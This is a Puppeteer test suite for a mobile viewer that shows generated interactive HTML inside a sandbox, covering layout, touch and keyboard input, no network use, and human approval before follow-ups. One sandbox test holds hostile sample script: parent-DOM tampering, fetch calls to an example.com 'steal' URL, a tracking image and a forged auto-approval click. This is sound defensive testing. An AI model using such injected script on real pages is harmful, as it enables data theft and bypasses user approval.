import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs/promises";
import puppeteer from "puppeteer-core";
import { viewerDocument } from "../lib/documents.mjs";
import { example } from "./examples.mjs";
const executablePath = process.env.CHROME_PATH;
if (!executablePath)
  throw Error("Set CHROME_PATH to your local Chromium executable.");
async function setup(t, html, width = 390, touch = true, resizeAction = null) {
  const browser = await puppeteer.launch({
    executablePath,
    headless: true,
    args: ["--no-sandbox", "--disable-dev-shm-usage"],
  });
  t.after(() => browser.close());
  const page = await browser.newPage();
  await page.setViewport({
    width,
    height: 844,
    isMobile: touch,
    hasTouch: touch,
    deviceScaleFactor: 1,
  });
  const network = [];
  page.on("response", (r) => {
    if (/^https?:/.test(r.url())) network.push(r.url());
  });
  await page.setContent(
    viewerDocument(
      { id: "00000000-0000-0000-0000-000000000000", html },
      "unguessable-test-action",
      resizeAction,
    ),
    { waitUntil: "load" },
  );
  await page.evaluate(() => {
    window.nativeCalls = [];
    window.Aether = {
      postMessage: (text) => window.nativeCalls.push(JSON.parse(text)),
    };
  });
  const frame = page.frames().find((f) => f.parentFrame());
  assert(frame);
  return { page, frame, network };
}
test("phone force lab calculates, resets and requires trusted review before drafting", async (t) => {
  const a = await example("interactive"),
    { page, frame, network } = await setup(t, a.html);
  await frame.waitForSelector("#result");
  assert.equal(await frame.$eval("#result", (e) => e.textContent), "6 N");
  await frame.$eval("#mass", (e) => {
    e.value = "5";
    e.dispatchEvent(new Event("input", { bubbles: true }));
  });
  assert.equal(await frame.$eval("#result", (e) => e.textContent), "15 N");
  await frame.tap("#followup");
  await page.waitForSelector("#review:not([hidden])");
  assert.deepEqual(await page.evaluate(() => nativeCalls), []);
  await page.$eval("#approve", (b) => b.click());
  assert.deepEqual(
    await page.evaluate(() => nativeCalls),
    [],
    "synthetic approval cannot call host",
  );
  await page.tap("#approve");
  const calls = await page.evaluate(() => nativeCalls);
  assert.equal(calls.length, 1);
  assert.deepEqual(calls[0].args.values, { mass: 5, acceleration: 3 });
  assert(!JSON.stringify(calls).includes("<html"));
  await frame.tap("#reset");
  assert.equal(await frame.$eval("#result", (e) => e.textContent), "6 N");
  assert.equal(
    await frame.evaluate(
      () => document.documentElement.scrollWidth <= innerWidth,
    ),
    true,
  );
  assert.deepEqual(network, []);
  await fs.mkdir("verification", { recursive: true });
  await page.screenshot({
    path: "verification/force-phone.png",
    fullPage: true,
  });
});
test("320px Anatomy controls move the actual gauge and start with no automatic motion", async (t) => {
  const a = await example("anatomy"),
    { page, frame, network } = await setup(t, a.html, 320);
  await frame.waitForSelector("[data-readout]");
  assert.equal(
    await frame.$eval("#dial-play", (e) => e.getAttribute("aria-pressed")),
    "false",
  );
  await frame.tap('[data-block="2"]');
  await frame.waitForFunction(
    () => document.querySelector("[data-readout]").textContent.includes("10.0"),
    { timeout: 5000 },
  );
  assert(
    (await frame.$eval("[data-readout]", (e) => e.textContent)).includes(
      "block 3",
    ),
  );
  await frame.tap("#dial-play");
  assert.equal(
    await frame.$eval("#dial-play", (e) => e.getAttribute("aria-pressed")),
    "true",
  );
  await frame.tap("#dial-play");
  assert.equal(
    await frame.$eval("#dial-play", (e) => e.getAttribute("aria-pressed")),
    "false",
  );
  await frame.tap("#dial-reset");
  await frame.waitForFunction(
    () => document.querySelector("[data-readout]").textContent.includes("18.0"),
    { timeout: 5000 },
  );
  assert.equal(
    await frame.evaluate(
      () => document.documentElement.scrollWidth <= innerWidth,
    ),
    true,
  );
  assert.deepEqual(network, []);
  await page.screenshot({
    path: "verification/anatomy-phone.png",
    fullPage: true,
  });
});
test("sandbox blocks parent DOM, fetch, nested frames and automatic followup approval", async (t) => {
  const html = `<button id="request" onclick="sendPrompt('Why?',{x:1})">Follow up</button><script>
try{parent.document.body.dataset.stolen='yes'}catch{window.parentBlocked=true}
fetch('https://example.com/steal').catch(()=>{});let image=new Image();image.src='https://example.com/track';
let nested=document.createElement('iframe');nested.src='https://example.com/nested';document.body.append(nested);
parent.postMessage({type:'visual-followup',text:'Automatic attempt',values:{x:1}},'*');
try{window.parent.document.getElementById('approve').click()}catch{window.approvalBlocked=true}
</script>`;
  const { page, frame, network } = await setup(t, html);
  assert.equal(await frame.evaluate(() => window.parentBlocked), true);
  assert.equal(await frame.evaluate(() => window.approvalBlocked), true);
  assert.deepEqual(await page.evaluate(() => nativeCalls), []);
  assert.deepEqual(network, []);
  await frame.evaluate(() =>
    parent.postMessage(
      { type: "visual-followup", text: "x".repeat(1300), values: {} },
      "*",
    ),
  );
  assert.deepEqual(await page.evaluate(() => nativeCalls), []);
});
test("desktop keyboard and reduced motion operate without touch or AI", async (t) => {
  const a = await example("anatomy"),
    { page, frame } = await setup(t, a.html, 1000, false);
  await page.emulateMediaFeatures([
    { name: "prefers-reduced-motion", value: "reduce" },
  ]);
  await frame.focus(".iso-stage");
  await page.keyboard.press("End");
  await frame.waitForFunction(
    () => document.querySelector("[data-readout]").textContent.includes("10.0"),
    { timeout: 5000 },
  );
  assert.equal(
    await frame.$eval("#dial-play", (e) => e.getAttribute("aria-pressed")),
    "false",
  );
});

test("intricate engine renders offline on a phone and responds to part selection and reset", async (t) => {
  const a = await example("anatomy", "engine"),
    { page, frame, network } = await setup(t, a.html, 390);
  await frame.waitForSelector(".rp-part");
  const buttons = await frame.$$(".rp-part");
  assert(buttons.length >= 10);
  const before = await frame.$eval("[data-readout]", (e) => e.textContent);
  await frame.tap(".rp-part");
  await frame.waitForFunction(
    (old) => document.querySelector("[data-readout]").textContent !== old,
    { timeout: 8000 },
    before,
  );
  await frame.tap("#engine-reset");
  await frame.waitForFunction(
    (old) => document.querySelector("[data-readout]").textContent === old,
    { timeout: 8000 },
    before,
  );
  assert.equal(
    await frame.evaluate(
      () => document.documentElement.scrollWidth <= innerWidth,
    ),
    true,
  );
  assert.deepEqual(network, []);
  await frame.evaluate(() => scrollTo(0, 0));
  await page.evaluate(() => scrollTo(0, 0));
  await page.screenshot({
    path: "verification/engine-phone.png",
    fullPage: true,
  });
});

test("inline viewer reports full content height without sending its document to the host", async (t) => {
  const { page, frame } = await setup(
    t,
    "<h1>Long explanation</h1>",
    390,
    true,
    "random-resize-action",
  );
  await frame.evaluate(() => {
    const p = document.createElement("div");
    p.style.height = "1800px";
    document.body.append(p);
  });
  await page.waitForFunction(() =>
    nativeCalls.some(
      (c) => c.action === "random-resize-action" && c.args.height >= 1800,
    ),
  );
  const calls = await page.evaluate(() => nativeCalls);
  assert(
    calls.every((c) => Object.keys(c.args).sort().join(",") === "height,id"),
  );
  assert.equal(await page.$eval("iframe", (e) => e.clientHeight >= 1800), true);
});

test("generated interactive triangle supports dragging, live mathematics and reset", async (t) => {
  const html = await fs.readFile(
    new URL("./fixtures/generated-triangle.html", import.meta.url),
    "utf8",
  );
  const { page, frame, network } = await setup(t, html, 390);
  await frame.waitForSelector("#values");
  assert(
    (await frame.$eval("#values", (e) => e.textContent)).includes(
      "29.86 square units",
    ),
  );
  const before = await frame.$eval("#tri", (e) => e.getAttribute("points"));
  const vertex = await frame.$("#handles circle:last-child"),
    box = await vertex.boundingBox();
  await page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
  await page.mouse.down();
  await page.mouse.move(
    box.x + box.width / 2 + 20,
    box.y + box.height / 2 + 35,
    { steps: 6 },
  );
  await page.mouse.up();
  const actual = await frame.$eval("#tri", (e) => e.getAttribute("points"));
  assert.notEqual(actual, before);
  const points = actual.split(" ").map((p) => p.split(",").map(Number));
  const [[ax, ay], [bx, by], [cx, cy]] = points;
  const area = Math.abs((bx - ax) * (cy - ay) - (by - ay) * (cx - ax)) / 3200;
  assert(
    (await frame.$eval("#values", (e) => e.textContent)).includes(
      area.toFixed(2) + " square units",
    ),
  );
  await frame.click("#reset");
  assert.equal(
    await frame.$eval("#tri", (e) => e.getAttribute("points")),
    before,
  );
  await page.keyboard.down("Shift");
  await page.keyboard.press("Tab");
  await page.keyboard.up("Shift");
  assert.equal(
    await frame.evaluate(
      () =>
        document.activeElement ===
        document.querySelector("#handles circle:last-child"),
    ),
    true,
  );
  await page.keyboard.press("ArrowDown");
  assert(
    (await frame.$eval("#values", (e) => e.textContent)).includes(
      "29.25 square units",
    ),
  );
  assert.deepEqual(network, []);
  await page.screenshot({
    path: "verification/generated-triangle-phone.png",
    fullPage: true,
  });
});

test("Anatomy browser kit draws new geometry, separates a cover, selects parts and resets", async (t) => {
  const { withAnatomyToolkit } = await import("../lib/anatomy.mjs");
  const html = await withAnatomyToolkit(
    await fs.readFile(
      new URL("./fixtures/anatomy-exploded.html", import.meta.url),
      "utf8",
    ),
  );
  const { page, frame, network } = await setup(t, html, 390);
  await frame.waitForSelector("#cover-geometry path");
  assert.equal(
    await frame.evaluate(() => typeof window.anatomy.solidSvg),
    "function",
  );
  const before = await frame.$eval("#cover-geometry", (e) => e.innerHTML);
  await frame.$eval("#separation", (e) => {
    e.value = 40;
    e.dispatchEvent(new Event("input", { bubbles: true }));
  });
  assert.notEqual(
    await frame.$eval("#cover-geometry", (e) => e.innerHTML),
    before,
  );
  await frame.click("#cover");
  assert.equal(
    await frame.$eval("#readout", (e) => e.textContent),
    "Cover: removable top",
  );
  await frame.click("#reset");
  assert.equal(
    await frame.$eval("#cover-geometry", (e) => e.innerHTML),
    before,
  );
  assert.equal(
    await frame.$eval("#readout", (e) => e.textContent),
    "Assembled",
  );
  assert.equal(
    await frame.evaluate(
      () => document.documentElement.scrollWidth <= innerWidth,
    ),
    true,
  );
  assert.deepEqual(network, []);
  await frame.evaluate(() => scrollTo(0, 0));
  await page.evaluate(() => scrollTo(0, 0));
  await page.screenshot({
    path: "verification/anatomy-kit-phone.png",
    fullPage: true,
  });
});

test("generated Anatomy figure contains its geometry above controls at phone widths", async t => {
  const {withAnatomyToolkit} = await import('../lib/anatomy.mjs');
  const html = await withAnatomyToolkit(await fs.readFile(new URL('./fixtures/generated-dial.html', import.meta.url), 'utf8'));
  const {page, frame} = await setup(t, html, 320);
  const check = async () => {
    await frame.waitForFunction(() => {
      const svg=document.querySelector('svg.iso-svg');if(!svg)return false;
      const b=svg.getBBox(),v=svg.viewBox.baseVal;
      return b.x>=v.x && b.y>=v.y && b.x+b.width<=v.x+v.width && b.y+b.height<=v.y+v.height;
    });
    assert.equal(await frame.evaluate(() => {
      const svg=document.querySelector('svg.iso-svg'),controls=document.querySelector('.controls');
      return getComputedStyle(svg).overflow==='hidden' && svg.getBoundingClientRect().bottom<=controls.getBoundingClientRect().top;
    }),true);
    assert.equal(await frame.evaluate(() => document.documentElement.scrollWidth<=innerWidth),true);
  };
  for(const width of [320,600]) {
    await page.setViewport({width,height:960,isMobile:true,hasTouch:true,deviceScaleFactor:1});
    for(const value of ['0','1']) {
      await frame.$eval('#explode',(input,value)=>{input.value=value;input.dispatchEvent(new Event('input'));},value);
      await frame.$eval('#lift',(input,value)=>{input.value=value;input.dispatchEvent(new Event('input'));},value);
      await check();
      assert.equal(await frame.$eval('#reading',e=>e.textContent),Number(value).toFixed(2)+' mm');
    }
  }
  await frame.click('#reset');await check();
  assert.equal(await frame.$eval('#reading',e=>e.textContent),'0.00 mm');
  await page.screenshot({path:'verification/generated-dial-contained.png',fullPage:true});
});
